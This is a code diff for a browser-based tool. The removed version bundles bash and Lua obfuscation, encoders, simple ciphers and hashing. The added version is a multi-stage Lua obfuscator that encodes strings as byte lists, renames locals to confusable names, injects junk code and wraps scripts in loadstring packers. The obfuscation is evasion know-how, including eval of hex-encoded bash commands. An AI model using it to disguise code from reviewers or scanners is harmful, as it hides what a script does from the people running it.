-    out = `#!/bin/bash\neval "$(printf '${oct}')"`;
-  } else if (method === 'varsplit') {
-    const words = src.split(/\s+/); let vd = '', call = '';
-    words.forEach((w, i) => { vd += `_v${i}="${w}"\n`; call += `$_v${i} `; });
-    out = `#!/bin/bash\n${vd}\n${call.trim()}`;
-  } else {
-    const cmd = src.split('\n')[0].replace('#!/bin/bash', '').trim();
-    if (cmd) out = `#!/bin/bash\n_x=$(printf '${Array.from(cmd).map(c => '\\x' + c.charCodeAt(0).toString(16)).join('')}')\neval "$_x"`;
-    else out = src;
-  }
-
-  document.getElementById('bash-out').value = out;
-  notice('bash-notice', 'notice-ok', `Done — method: ${method}`);
-}
-
-function obfuscateLua() {
-  const src = document.getElementById('lua-in').value.trim();
-  if (!src) { notice('lua-notice', 'notice-warn', 'No input.'); return; }
-  const opts = getOpts('lua-opts');
-  let out = src;
-
-  if (opts.stripComments) {
-    const ls = [];
-    out = out.replace(/\[(=*)\[([\s\S]*?)\]\1\]/g, m => { ls.push(m); return '\u0000L' + (ls.length - 1) + '\u0000'; });
-    out = out.replace(/--\[(=*)\[[\s\S]*?\]\1\]/g, '').replace(/--[^\n]*/g, '')
-             .replace(/\u0000L(\d+)\u0000/g, (m, i) => ls[parseInt(i)]);
-  }
-  if (opts.renameLocals) {
-    const ln = new Map();
-    const gen = () => '_0x' + Math.random().toString(16).slice(2, 8);
-    out = out.replace(/\blocal\s+function\s+([a-zA-Z_]\w*)/g, (m, n) => {
-      if (!ln.has(n)) ln.set(n, gen()); return 'local function ' + ln.get(n);
-    });
-    out = out.replace(/\blocal\s+(?!function\b)([a-zA-Z_]\w*(?:\s*,\s*[a-zA-Z_]\w*)*)/g, (m, names) =>
-      'local ' + names.split(',').map(n => { const t = n.trim(); if (!ln.has(t)) ln.set(t, gen()); return ln.get(t); }).join(', ')
-    );
-    ln.forEach((nn, on) => { out = out.replace(new RegExp('\\b' + on + '\\b', 'g'), nn); });
-  }
-  if (opts.encodeStrings) {
-    const enc = s => {
-      if (!s.length) return '""';
-      const bytes = Array.from(new TextEncoder().encode(s));
-      return '"' + bytes.map(b => '\\' + b.toString().padStart(3, '0')).join('') + '"';
-    };
-    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, i) => enc(i))
-             .replace(/'((?:[^'\\]|\\.)*)'/g, (m, i) => {
-               if (!i.length) return "''";
-               const bytes = Array.from(new TextEncoder().encode(i));
-               return "'" + bytes.map(b => '\\' + b.toString().padStart(3, '0')).join('') + "'";
-             });
-  }
-  if (opts.hexNumbers) {
-    out = out.replace(/\b(\d+)\b/g, (m, n) => { const v = parseInt(n); return v > 9 ? '0x' + v.toString(16) : m; });
-  }
-  if (opts.minify) {
-    const saved = [];
-    out = out.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, m => { saved.push(m); return '\u0000S' + (saved.length - 1) + '\u0000'; });
-    out = out.replace(/[ \t]+/g, ' ').replace(/\s*\n\s*/g, '\n').replace(/\n{2,}/g, '\n').trim();
-    out = out.replace(/\u0000S(\d+)\u0000/g, (m, i) => saved[parseInt(i)]);
-  }
-  if (opts.loadstring) {
-    const bytes = Array.from(new TextEncoder().encode(out));
-    out = `local _t={${bytes.join(',')}}\nlocal _s=''\nfor _,v in ipairs(_t) do _s=_s..string.char(v) end\nloadstring(_s)()`;
-  }
-
-  document.getElementById('lua-out').value = out;
-  const ratio = (out.length / src.length).toFixed(2) + 'x';
-  document.getElementById('lua-ratio').textContent = ratio;
-  document.getElementById('lua-stats').style.display = '';
-  notice('lua-notice', 'notice-ok', `Obfuscated — ${src.length} → ${out.length} chars`);
-}
-
-// ══════════════════════════════════════════
-//  ENCODE / DECODE
-// ══════════════════════════════════════════
-function b64Encode() {
-  const v = document.getElementById('b64-in').value;
-  const u = document.getElementById('b64-variant').value === 'url';
-  try {
-    let e = btoa(unescape(encodeURIComponent(v)));
-    if (u) e = e.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-    document.getElementById('b64-out').value = e;
-  } catch(e) { notice('b64-notice', 'notice-err', 'Encoding failed: ' + e.message); }
-}
-function b64Decode() {
-  let v = document.getElementById('b64-in').value.trim();
-  const u = document.getElementById('b64-variant').value === 'url';
-  try {
-    if (u) { v = v.replace(/-/g, '+').replace(/_/g, '/'); while (v.length % 4) v += '='; }
-    document.getElementById('b64-out').value = decodeURIComponent(escape(atob(v)));
-  } catch(e) { notice('b64-notice', 'notice-err', 'Decoding failed — invalid base64.'); }
-}
-
-function urlEncode() {
-  const v = document.getElementById('url-in').value, mode = document.getElementById('url-mode').value;
-  let out;
-  if (mode === 'component') out = encodeURIComponent(v);
-  else if (mode === 'full') out = Array.from(v).map(c => {
-    const code = c.charCodeAt(0);
-    if ((code >= 0x30 && code <= 0x39) || (code >= 0x41 && code <= 0x5A) || (code >= 0x61 && code <= 0x7A) || '-_.~'.includes(c)) return c;
-    return '%' + code.toString(16).toUpperCase().padStart(2, '0');
-  }).join('');
-  else out = Array.from(encodeURIComponent(v)).map(c => c === '%' ? '%25' : c).join('');
-  document.getElementById('url-out').value = out;
-}
-function urlDecode() {
-  try { document.getElementById('url-out').value = decodeURIComponent(document.getElementById('url-in').value); }
-  catch(e) { notice('url-notice', 'notice-err', 'Decode failed — malformed percent encoding.'); }
-}
-
-function hexEncode() {
-  const v = document.getElementById('hex-in').value;
-  const sep   = document.getElementById('hex-sep').value;
-  const upper = document.getElementById('hex-case').value === 'upper';
-  const bytes = Array.from(v).map(c => { let h = c.charCodeAt(0).toString(16).padStart(2, '0'); return upper ? h.toUpperCase() : h; });
-  let out;
-  if      (sep === ' ')   out = bytes.join(' ');
-  else if (sep === '')    out = bytes.join('');
-  else if (sep === '\\x') out = bytes.map(b => '\\x' + b).join('');
-  else                    out = bytes.map(b => '0x' + b).join(',');
-  document.getElementById('hex-out').value = out;
-}
-function hexDecode() {
-  let v = document.getElementById('hex-in').value.trim();
-  try {
-    v = v.replace(/\\x/g, '').replace(/0x/gi, '').replace(/,/g, ' ').replace(/\s+/g, ' ').trim();
-    document.getElementById('hex-out').value = v.split(' ').map(b => String.fromCharCode(parseInt(b, 16))).join('');
-  } catch(e) { notice('hex-notice', 'notice-err', 'Decode failed — check hex format.'); }
-}
-
-const HTML_NAMED = { '<':'&lt;', '>':'&gt;', '&':'&amp;', '"':'&quot;', "'":'&#x27;' };
-function htmlEncode() {
-  const v = document.getElementById('html-in').value, mode = document.getElementById('html-mode').value;
-  let out;
-  if      (mode === 'named')   out = v.replace(/[<>&"']/g, c => HTML_NAMED[c] || c);
-  else if (mode === 'dec')     out = v.replace(/[<>&"']/g, c => '&#' + c.charCodeAt(0) + ';');
-  else if (mode === 'hex')     out = v.replace(/[<>&"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
-  else if (mode === 'all-dec') out = Array.from(v).map(c => '&#' + c.charCodeAt(0) + ';').join('');
-  else                         out = Array.from(v).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
-  document.getElementById('html-out').value = out;
-}
-function htmlDecode() {
-  const el = document.createElement('textarea');
-  el.innerHTML = document.getElementById('html-in').value;
-  document.getElementById('html-out').value = el.value;
-}
-
-// ══════════════════════════════════════════
-//  CIPHERS
-// ══════════════════════════════════════════
-function getXorKey() {
-  const raw  = document.getElementById('xor-key').value.trim();
-  const mode = document.getElementById('xor-keymode').value;
-  if (mode === 'str') return Array.from(raw).map(c => c.charCodeAt(0));
-  if (raw.startsWith('0x') || raw.startsWith('0X')) return [parseInt(raw, 16)];
-  if (!isNaN(raw)) return [parseInt(raw)];
-  return Array.from(raw).map(c => c.charCodeAt(0));
-}
-function xorProcess(dir) {
-  const keyArr = getXorKey(), mode = document.getElementById('xor-keymode').value, outFmt = document.getElementById('xor-outfmt').value;
-  let inputBytes;
-  if (dir === 'dec') {
-    const v = document.getElementById('xor-in').value.trim().replace(/\\x/g, '').replace(/0x/gi, '').replace(/,/g, ' ').replace(/\s+/g, ' ').trim();
-    inputBytes = v.split(' ').map(b => parseInt(b, 16));
-  } else {
-    inputBytes = Array.from(document.getElementById('xor-in').value).map(c => c.charCodeAt(0));
-  }
-  if (!inputBytes.length) { notice('xor-notice', 'notice-warn', 'No input.'); return; }
-  const result = inputBytes.map((b, i) => {
-    let k = mode === 'rolling' ? (keyArr[0] + i) & 0xFF : keyArr[i % keyArr.length];
-    return b ^ k;
-  });
-  let out;
-  if      (outFmt === 'hex') out = result.map(b => b.toString(16).padStart(2, '0')).join(' ');
-  else if (outFmt === 'b64') out = btoa(result.map(b => String.fromCharCode(b)).join(''));
-  else                       out = result.map(b => String.fromCharCode(b)).join('');
-  document.getElementById('xor-out').value = out;
-  notice('xor-notice', 'notice-ok', `${dir === 'enc' ? 'Encrypted' : 'Decrypted'} ${inputBytes.length} bytes`);
-}
-
-function rotApply() {
-  const v  = document.getElementById('rot-in').value;
-  const n  = parseInt(document.getElementById('rot-n').value) || 13;
-  const cs = document.getElementById('rot-charset').value;
-  let out;
-  if (cs === 'alpha') {
-    out = v.replace(/[a-zA-Z]/g, c => { const base = c >= 'a' ? 97 : 65; return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26) + base); });
-  } else {
-    out = v.replace(/[\x20-\x7e]/g, c => String.fromCharCode(((c.charCodeAt(0) - 0x20 + n) % 95) + 0x20));
-  }
-  document.getElementById('rot-out').value = out;
-}
-
-function caesarShift(text, shift) {
-  shift = ((shift % 26) + 26) % 26;
-  return text.replace(/[a-zA-Z]/g, c => {
-    const base = c >= 'a' ? 97 : 65;
-    return String.fromCharCode(((c.charCodeAt(0) - base + shift) % 26) + base);
-  });
-}
-function caesarEnc()   { document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, parseInt(document.getElementById('cae-shift').value) || 3); }
-function caesarDec()   { const shift = parseInt(document.getElementById('cae-shift').value) || 3; document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, 26 - shift); }
-function caesarBrute() { const v = document.getElementById('cae-in').value; let lines = ''; for (let i = 1; i <= 25; i++) lines += `ROT-${String(i).padStart(2,'0')}: ${caesarShift(v, i)}\n`; document.getElementById('cae-out').value = lines.trim(); }
-
-// ══════════════════════════════════════════
-//  HASH
-// ══════════════════════════════════════════
-async function computeHashes() {
-  const v = document.getElementById('hash-in').value;
-  if (!v) return;
-  const enc = new TextEncoder(), data = enc.encode(v);
-  const algos = ['SHA-1', 'SHA-256', 'SHA-384', 'SHA-512'];
-  const results = await Promise.all(algos.map(async a => {
-    const buf = await crypto.subtle.digest(a, data);
-    const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
-    return { name: a, hex };
-  }));
-  document.getElementById('hash-results').innerHTML = results.map(r =>
-    `<div class="hash-row">
-      <div class="hash-name">${r.name}</div>
-      <div class="hash-val" title="${r.hex}">${r.hex}</div>
-      <button class="btn btn-ghost" onclick="navigator.clipboard.writeText('${r.hex}');copyOutput('hash-in')">Copy</button>
-    </div>`
-  ).join('');
-}
-
-// ══════════════════════════════════════════
-//  STRING TOOLS
-// ══════════════════════════════════════════
-function strTool(op) {
-  const v = document.getElementById('str-in').value;
-  let out = v;
-  switch (op) {
-    case 'reverse':  out = v.split('').reverse().join(''); break;
-    case 'upper':    out = v.toUpperCase(); break;
-    case 'lower':    out = v.toLowerCase(); break;
-    case 'title':    out = v.replace(/\b\w/g, c => c.toUpperCase()); break;
-    case 'trim':     out = v.split('\n').map(l => l.trim()).join('\n').trim(); break;
-    case 'dedupe':   out = [...new Set(v.split('\n'))].join('\n'); break;
-    case 'sort':     out = v.split('\n').sort((a, b) => a.localeCompare(b)).join('\n'); break;
-    case 'sortz':    out = v.split('\n').sort((a, b) => b.localeCompare(a)).join('\n'); break;
-    case 'linerev':  out = v.split('\n').reverse().join('\n'); break;
-    case 'count': {
-      const chars = v.length, words = v.trim() ? v.trim().split(/\s+/).length : 0, lines = v.split('\n').length;
-      out = `Characters: ${chars}\nWords: ${words}\nLines: ${lines}\n\n${v}`;
-      break;
+/* ═══════════════════════════════════════════
+   STRING BYTE DECODER
+═══════════════════════════════════════════ */
+function luaStrBytes(tok){
+  const inner=tok.v.slice(1,-1);
+  const bytes=[];let i=0;
+  while(i<inner.length){
+    if(inner[i]!=='\\'){
+      const c=inner.charCodeAt(i);
+      if(c<128){bytes.push(c);i++}
+      else{
+        const enc=new TextEncoder().encode(inner[i]);
+        enc.forEach(b=>bytes.push(b));i++;
+      }
+      continue;
+    }
+    i++;if(i>=inner.length)break;
+    switch(inner[i]){
+      case'a':bytes.push(7);i++;break;case'b':bytes.push(8);i++;break;
+      case'f':bytes.push(12);i++;break;case'n':bytes.push(10);i++;break;
+      case'r':bytes.push(13);i++;break;case't':bytes.push(9);i++;break;
+      case'v':bytes.push(11);i++;break;case'\\':bytes.push(92);i++;break;
+      case'"':bytes.push(34);i++;break;case"'":bytes.push(39);i++;break;
+      case'\n':bytes.push(10);i++;break;
+      case'\r':bytes.push(13);i++;if(inner[i]==='\n'){bytes.push(10);i++}break;
+      case'x':{const h=inner.slice(i+1,i+3);if(/^[0-9a-fA-F]{2}$/.test(h)){bytes.push(parseInt(h,16));i+=3}else{bytes.push(120);i++}break}
+      case'u':{
+        if(inner[i+1]==='{'){const ci=inner.indexOf('}',i+2);if(ci!==-1){const cp=parseInt(inner.slice(i+2,ci),16);new TextEncoder().encode(String.fromCodePoint(cp)).forEach(b=>bytes.push(b));i=ci+1}else{bytes.push(117);i++}}
+        else{bytes.push(117);i++}break
+      }
+      case'z':{i++;while(i<inner.length&&/\s/.test(inner[i]))i++;break}
+      default:{const dm=inner.slice(i).match(/^(\d{1,3})/);if(dm){bytes.push(parseInt(dm[1])&255);i+=dm[1].length}else{bytes.push(inner.charCodeAt(i));i++}}
     }
   }
-  document.getElementById('str-out').value = out;
+  return bytes;
 }
 
-// ═══════════
+function bytesToStringCharCall(bytes,chunkSize){
+  if(bytes.length===0)return'""';
+  chunkSize=chunkSize||50;
+  const chunks=[];
+  for(let i=0;i<bytes.length;i+=chunkSize){
+    chunks.push('string.char('+bytes.slice(i,i+chunkSize).join(',')+')')
+  }
+  return chunks.length===1?chunks[0]:'('+chunks.join('..')+')';
+}
+
+/* ═══════════════════════════════════════════
+   NAME GENERATOR
+═══════════════════════════════════════════ */
+function makeNameGen(style){
+  let counter=0;
+  const CHAOS='IlIOo0';
+  return function(){
+    const n=counter++;
+    if(style==='hex')return'_0x'+n.toString(16).padStart(4,'0');
+    if(style==='chaos'){let s='_',v=n;do{s+=CHAOS[v%CHAOS.length];v=Math.floor(v/CHAOS.length)-1}while(v>=0);return s}
+    // rand
+    return'_'+Math.floor(Math.random()*0xFFFFFFFF).toString(16).padStart(8,'0');
+  };
+}
+
+/* ═══════════════════════════════════════════
+   OBFUSCATION STAGES
+═══════════════════════════════════════════ */
+
+// 1. Strip comments
+function stageStripComments(tokens){
+  return tokens.filter(t=>t.t!=='LC'&&t.t!=='BC');
+}
+
+// 2. Collect all renameable local names from token stream
+function collectLocals(tokens){
+  const names=new Set();
+  for(let i=0;i<tokens.length;i++){
+    const t=tokens[i];
+    // local [ function ] name
+    if(t.t==='K'&&t.v==='local'){
+      let j=i+1;
+      while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+      if(tokens[j]?.t==='K'&&tokens[j].v==='function'){
+        j++;while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+        if(tokens[j]?.t==='I')names.add(tokens[j].v);
+      } else if(tokens[j]?.t==='I'){
+        // local a, b, c
+        names.add(tokens[j].v);j++;
+        while(j<tokens.length){
+          while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+          if(tokens[j]?.v===','){j++;while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;if(tokens[j]?.t==='I'){names.add(tokens[j].v);j++}}
+          else break;
+        }
+      }
+    }
+    // function params
+    if(t.t==='K'&&t.v==='function'){
+      let j=i+1;
+      while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+      // skip function name (ident, dots, colons)
+      while(j<tokens.length&&tokens[j].t==='I'){
+        j++;while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+        if(tokens[j]?.v==='.'||tokens[j]?.v===':'){j++;while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++}
+        else break;
+      }
+      if(tokens[j]?.v==='('){
+        j++;
+        while(j<tokens.length&&tokens[j]?.v!==')'){
+          while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+          if(tokens[j]?.t==='I')names.add(tokens[j].v);
+          j++;
+          while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+          if(tokens[j]?.v===',')j++;
+        }
+      }
+    }
+    // for vars
+    if(t.t==='K'&&t.v==='for'){
+      let j=i+1;
+      while(j<tokens.length){
+        while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+        if(tokens[j]?.t==='I'){names.add(tokens[j].v);j++}else break;
+        while(j<tokens.length&&(tokens[j].t==='W'||tokens[j].t==='NL'))j++;
+        if(tokens[j]?.v===',')j++;else break;
+      }
+    }
+  }
+  return names;
+}
+
+// 3. Rename locals
+function stageRenameLocals(tokens,opts,genName){
+  const names=collectLocals(tokens);
+  const renameMap=new Map();
+  const PROTECTED=new Set([...LUA_KEYWORDS,...LUA_STD,'self','_G','_ENV','_VERSION','arg','...']);
+  names.forEach(n=>{if(!PROTECTED.has(n))renameMap.set(n,genName())});
+  return tokens.map(t=>{
+    if(t.t==='I'&&renameMap.has(t.v))return{...t,v:renameMap.get(t.v)};
+    return t;
+  });
+}
+
+// 4. Encode strings
+function stageEncodeStrings(tokens,opts){
+  const chunkSize=opts.splitStrings?30:200;
+  return tokens.map(t=>{
+    if(t.t!=='S')return t;
+    const bytes=luaStrBytes(t);
+    if(bytes.length===0)return t;
+    const encoded=bytesToStringCharCall(bytes,chunkSize);
+    return{t:'RAW',v:encoded};
+  });
+}
+
+// 5. Encode numbers
+function stageEncodeNumbers(tokens,opts){
+  return tokens.map(t=>{
+    if(t.t!=='N')return t;
+    const raw=t.v;
+    // Skip if already hex or float
+    if(raw.startsWith('0x')||raw.startsWith('0X')||raw.includes('.')||raw.includes('e')||raw.includes('E'))return t;
+    const n=parseInt(raw);
+    if(isNaN(n)||n<0)return t;
+    if(opts.encodeNumbersExpr&&n>1){
+      // Express as (a*b + c)
+      const a=Math.max(2,Math.floor(Math.sqrt(n)));
+      const b=Math.floor(n/a);
+      const c=n-a*b;
+      const pa='0x'+a.toString(16),pb='0x'+b.toString(16);
+      if(c===0)return{t:'RAW',v:`(${pa}*${pb})`};
+      const pc='0x'+Math.abs(c).toString(16);
+      return{t:'RAW',v:`(${pa}*${pb}${c>0?'+':'-'}${pc})`};
+    }
+    return{t:'RAW',v:'0x'+n.toString(16)};
+  });
+}
+
+// 6. Minify
+function stageMinify(tokens){
+  const out=[];
+  for(let i=0;i<tokens.length;i++){
+    const t=tokens[i];
+    if(t.t==='NL'){
+      // Keep one newline max, collapse multiples
+      if(out.length&&out[out.length-1].t==='NL')continue;
+      // Between ident/keyword tokens, need separator
+      const prev=out[out.length-1];const next=tokens.find((x,j)=>j>i&&x.t!=='NL'&&x.t!=='W');
+      if(prev&&next&&
+         (prev.t==='I'||prev.t==='K'||prev.t==='N'||prev.v===')'||prev.v===']'||prev.v==='"'||prev.v==="'")&&
+         (next.t==='I'||next.t==='K'||next.t==='N'))
+      {out.push({t:'W',v:' '});continue}
+      continue;
+    }
+    if(t.t==='W'){
+      const prev=out[out.length-1];const next=tokens[i+1];
+      if(!prev||prev.t==='NL'||prev.t==='W')continue;
+      if(!next||next.t==='NL'||next.t==='W')continue;
+      // Need space between ident+ident, keyword+ident etc.
+      const needSep=(a,b)=>{
+        const idLike=x=>x&&(x.t==='I'||x.t==='K'||x.t==='N');
+        return idLike(a)&&idLike(b);
+      };
+      if(needSep(prev,next)){out.push({t:'W',v:' '});continue}
+      continue;
+    }
+    out.push(t);
+  }
+  return out;
+}
+
+// 7. Inject junk vars
+function stageJunkVars(tokens,genName){
+  const out=[];
+  let inserted=0;
+  for(let i=0;i<tokens.length;i++){
+    out.push(tokens[i]);
+    // Insert after 'end' or semicolons occasionally
+    if((tokens[i].v==='end'||tokens[i].v===';')&&Math.random()<0.25&&inserted<30){
+      const jv=genName();
+      out.push({t:'RAW',v:` local ${jv}=nil `});
+      inserted++;
+    }
+  }
+  return out;
+}
+
+// 8. Inject junk blocks
+function stageJunkBlocks(tokens,genName){
+  const JUNK=[
+    ()=>{const v=genName();return` if false then local ${v}=nil end `},
+    ()=>{const v=genName();const n=Math.floor(Math.random()*256);return` do local ${v}=0x${n.toString(16)} end `},
+    ()=>{const v=genName(),v2=genName();return` do local ${v}=${genName().replace(/[^0-9a-fx]/gi,'')};local ${v2}=nil end `},
+  ];
+  const out=[];let blk=0;
+  for(let i=0;i<tokens.length;i++){
+    out.push(tokens[i]);
+    if(tokens[i].v==='end'&&Math.random()<0.2&&blk<20){
+      out.push({t:'RAW',v:JUNK[blk%JUNK.length]()});
+      blk++;
+    }
+  }
+  return out;
+}
+
+// 9. do…end wrap
+function stageDoEndWrap(src){
+  return`do\n${src}\nend\n`;
+}
+
+// 10. Table proxy for string lib
+function stageTableProxy(src,genName){
+  const tbl=genName(),sc=genName(),mc=genName(),tc=genName();
+  const header=`local ${tbl}={[${sc}]=string,[${mc}]=math,[${tc}]=table}\n`;
+  // Simple replace: string. → _tbl[_sc].  — not perfect but works for simple scripts
+  // For safety, just inject the header as a caching hint
+  return header+src;
+}
+
+// 11. loadstring wrap
+function stageLoadstringWrap(src,obfuscateWrapper,nameStyle){
+  const bytes=Array.from(new TextEncoder().encode(src));
+  const CHUNK=200;
+  const chunks=[];
+  for(let i=0;i<bytes.length;i+=CHUNK)chunks.push(bytes.slice(i,i+CHUNK));
+
+  const genW=makeNameGen(nameStyle);
+  const vTbl=genW(),vStr=genW(),vChr=genW(),vCat=genW(),vLd=genW(),vFn=genW();
+
+  let wrapper;
+  if(chunks.length===1){
+    const charList=chunks[0].join(',');
+    if(obfuscateWrapper){
+      wrapper=`local ${vStr}=string;local ${vChr}=${vStr}.char;local ${vLd}=loadstring or load;${vLd}(${vChr}(${charList}))()`;
+    }else{
+      wrapper=`(loadstring or load)(string.char(${charList}))()`;
+    }
+  }else{
+    const entries=chunks.map((c,idx)=>`[${idx+1}]=string.char(${c.join(',')})`).join(',');
+    if(obfuscateWrapper){
+      wrapper=`local ${vTbl}={${entries}};local ${vCat}=table.concat;local ${vLd}=loadstring or load;${vLd}(${vCat}(${vTbl},""))()`;
+    }else{
+      wrapper=`local _t={${entries}};(loadstring or load)(table.concat(_t,""))()`;
+    }
+  }
+  return wrapper;
+}
+
+/* ═══════════════════════════════════════════
+   MAIN PIPELINE
+═══════════════════════════════════════════ */
+function obfuscate(src,opts){
+  const genName=makeNameGen(opts.nameStyle||'hex');
+  let tokens=tokenizeLua(src);
+
+  if(opts.stripComments)tokens=stageStripComments(tokens);
+
+  for(let pass=0;pass<(opts.passes||1);pass++){
+    if(opts.renameLocals||opts.renameParams)tokens=stageRenameLocals(tokens,opts,genName);
+  }
+
+  if(opts.encodeStrings)tokens=stageEncodeStrings(tokens,opts);
+  if(opts.encodeNumbers||opts.encodeNumbersExpr)tokens=stageEncodeNumbers(tokens,opts);
+  if(opts.junkVars)tokens=stageJunkVars(tokens,genName);
+  if(opts.junkBlocks)tokens=stageJunkBlocks(tokens,genName);
+  if(opts.minify)tokens=stageMinify(tokens);
+
+  let out=tokensToString(tokens);
+
+  if(opts.tableProxy)out=stageTableProxy(out,genName);
+  if(opts.doEndWrap)out=stageDoEndWrap(out);
+  if(opts.loadstringWrap)out=stageLoadstringWrap(out,opts.obfWrapper,opts.nameStyle);
+  if(opts.doublePack)out=stageLoadstringWrap(out,opts.obfWrapper,opts.nameStyle);
+
+  return out;
+}
+
+/* ═══════════════════════════════════════════
+   RUN
+═══════════════════════════════════════════ */
+function setProgress(pct,label){
+  document.getElementById('progress-fill').style.width=pct+'%';
+  document.getElementById('progress-label').textContent=label;
+}
+
+function runObfuscate(){
+  const src=document.getElementById('lua-in').value.trim();
+  if(!src){notice('warn','No input — paste a Lua script first.');return}
+
+  const opts=getOpts();
+
+  // Show progress
+  const pw=document.getElementById('progress-wrap');
+  pw.classList.add('show');
+  document.getElementById('run-btn').disabled=true;
+  setProgress(0,'Tokenizing…');
+
+  setTimeout(()=>{
+    try{
+      setProgress(20,'Stripping comments…');
+      setTimeout(()=>{
+        setProgress(40,'Renaming variables…');
+        setTimeout(()=>{
+          setProgress(60,'Encoding literals…');
+          setTimeout(()=>{
+            setProgress(80,'Packing…');
+            setTimeout(()=>{
+              try{
+                const out=obfuscate(src,opts);
+                document.getElementById('lua-out').value=out;
+                setProgress(100,'Done');
+
+                const ratio=(out.length/src.length).toFixed(2)+'×';
+                const size=out.length>1024?(out.length/1024).toFixed(1)+' KB':out.length+' B';
+                document.getElementById('stat-ratio').textContent=ratio;
+                document.getElementById('stat-size').textContent=size;
+                document.getElementById('stats-chip').style.display='';
+
+                notice('ok',`Obfuscated — ${src.length} → ${out.length} chars (${ratio})`);
+              }catch(e){
+                notice('err','Error: '+e.message);
+                document.getElementById('lua-out').value='-- Error: '+e.message;
+              }
+              pw.classList.remove('show');
+              document.getElementById('run-btn').disabled=false;
+            },150);
+          },80);
+        },80);
+      },80);
+    }catch(e){
+      notice('err','Tokenize error: '+e.message);
+      pw.classList.remove('show');
+      document.getElementById('run-btn').disabled=false;
+    }
+  },30);
+}
+
+/* ═══════════════════════════════════════════
+   INIT
+═══════════════════════════════════════════ */
+(function init(){
+  ensureAdmin();
+  const s=getSession();
+  if(s)enterApp(s);
+  updateStrength();
+})();
+</script>
+</body>
+</html>
